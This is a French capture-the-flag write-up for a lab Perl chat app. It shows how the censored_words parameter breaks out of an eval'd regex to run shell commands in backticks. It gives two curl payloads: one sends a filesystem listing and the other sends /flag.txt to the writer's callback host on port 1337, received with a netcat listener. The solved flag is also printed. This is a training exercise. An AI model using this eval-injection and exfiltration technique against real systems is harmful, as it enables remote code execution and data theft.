Il faut d'abord suivre le setup wireguard et discord puis lancer dans discord $spawn2pwn spawn 6.

Dans wireguard il faut ensuite copier coller ce que le bot nous donne comme information.


Pour voir si le setup est correct il faut s'assurer qu'un chat apparait quand on ouvre dans notre fureteur http://10.128.0.32/

Ensuite il faut récupérer le fichier index.pl.bak

C'est un fichier perl. On doit appeler /send avec deux paramètres (msg et censored_words)
Si un mot qu'on précise dans censored_words est présent dans msg alors il est remplacé par des astérisques.
Mais on peut faire une injection au niveau de censored_words.
Dans le bloc eval on peut injecter un code car il insère un escaped_pattern qui est notre paramètre censored_words.
eval "sub { \$_[0] =~ s/($escaped_pattern)/\"*\"x (length \$1)/gie }"
Le regex est ce qu'il y a entre les deux front slash / --> s/le_contenu/
Si censored_words est ```)\/\/;``` ca fera ```s/()\\/\\/;``` quittant ainsi le regex.
Alors on peut ajouter une commande malicieuse entre backticks du genre un find de fichier ou peu importe ...
Si censored_words est ```)\/\/; `une commande malicieuse entre backtick` } ```

En voici un exemple:
Cette commande écrit dans un fichier /tmp/out l'ensemble de nom des fichiers présent sous / ( avec max depth de 3) puis me le renvoie sur ma machine au port 1337
```bash
curl http://10.128.0.32/send \
  --data-urlencode 'msg=x' \
  --data-urlencode 'censored_words=)\/\/; `find / -maxdepth 3 -type f > /tmp/out && curl -s callback-53233.s2p:1337 --data-binary @/tmp/out` } #'
```
*** le 53233 est mon UserID de discord.
--data-binary est une option de curl pour m'envoyer le contenu raw sans preprocess (sans strip, carriege return etc ...)
Il faut s'assurer d'avoir lancé dans un terminal nc -l 1337 avant de lancer le curl dans un second terminal.

Ca nous retourne la présence d'un fichier flag.txt

Il suffit maintenant de retourner son contenu avec:
```bash
curl http://10.128.0.32/send \
  --data-urlencode 'msg=x' \
  --data-urlencode 'censored_words=)\/\/; `curl -s callback-53233.s2p:1337 --data-binary @/flag.txt` } #'
```

FLAG-30487de67634c7fc447cea11d8b2137c